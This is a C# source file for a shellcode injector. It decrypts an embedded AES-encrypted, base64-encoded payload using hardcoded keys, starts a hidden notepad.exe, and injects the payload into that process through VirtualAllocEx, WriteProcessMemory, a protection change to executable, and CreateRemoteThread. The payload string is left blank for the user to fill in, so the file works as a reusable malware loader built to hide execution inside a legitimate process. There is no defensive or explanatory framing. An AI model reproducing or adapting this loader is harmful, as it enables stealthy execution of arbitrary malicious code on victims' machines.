using System;
using System.Collections;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Net.Http;
using System.Diagnostics;

namespace ShellcodeInjector
{
    class Program
    {
        // API imports for shellcode injection
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        // Decryption parameters
        public static void Decrypt(string CipherText, string Password = "8687ggvuytfdYVGVVYRTFYTFytgiyut6",
              string Salt = "igfiIFYT756", string HashAlgorithm = "SHA1",
              int PasswordIterations = 420, string InitialVector = "OFRna73m*aze01xY",
              int KeySize = 256)
        {
            byte[] InitialVectorBytes = Encoding.ASCII.GetBytes(InitialVector);
            byte[] SaltValueBytes = Encoding.ASCII.GetBytes(Salt);
            byte[] CipherTextBytes = Convert.FromBase64String(CipherText);
            PasswordDeriveBytes DerivedPassword = new PasswordDeriveBytes(Password, SaltValueBytes, HashAlgorithm, PasswordIterations);
            byte[] KeyBytes = DerivedPassword.GetBytes(KeySize / 8);
            RijndaelManaged SymmetricKey = new RijndaelManaged();
            SymmetricKey.Mode = CipherMode.CBC;
            byte[] PlainTextBytes = new byte[CipherTextBytes.Length];
            int ByteCount = 0;
            using (ICryptoTransform Decryptor = SymmetricKey.CreateDecryptor(KeyBytes, InitialVectorBytes))
            {
                using (MemoryStream MemStream = new MemoryStream(CipherTextBytes))
                {
                    using (CryptoStream CryptoStream = new CryptoStream(MemStream, Decryptor, CryptoStreamMode.Read))
                    {
                        ByteCount = CryptoStream.Read(PlainTextBytes, 0, PlainTextBytes.Length);
                        MemStream.Close();
                        CryptoStream.Close();
                    }
                }
            }
            SymmetricKey.Clear();
            // Injection process starts here
            Process proc = new Process();
            proc.StartInfo.FileName = "C:\\WINDOWS\\SYSTEM32\\NOTEPAD.EXE";
            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.Start();
            int pid = proc.Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x04);
            IntPtr outSize;
            uint lpflOldProtect;
            WriteProcessMemory(hProcess, addr, PlainTextBytes, PlainTextBytes.Length, out outSize);
            VirtualProtectEx(hProcess, addr, 0x1000, 0x20, out lpflOldProtect);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }


        static void Main(string[] args)
        {
            // Place AES encrypted/B64 encoded shellcode below 
            string sc64 = "";
            Decrypt(sc64);
        }
    }
}
